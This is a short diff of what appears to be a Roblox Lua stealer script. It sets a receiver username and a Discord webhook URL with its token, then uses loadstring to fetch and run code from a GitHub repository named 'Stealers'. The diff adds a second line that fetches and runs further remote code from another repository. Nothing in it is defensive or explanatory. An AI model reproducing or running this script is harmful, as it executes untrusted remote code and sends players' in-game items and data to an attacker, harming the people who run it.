@@ -2,3 +2,5 @@ Receiver = "robloxian000000"
 Webhook = "https://discord.com/api/webhooks/1303514921295810630/2rE9hItY260Aa1BP4ZelDJ93ktuz4dfnMMIEwoNRIh736pvW94P1hlPmjoY3WPnRc67n"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/mustachioMman/testing/refs/heads/main/tester"), true))()
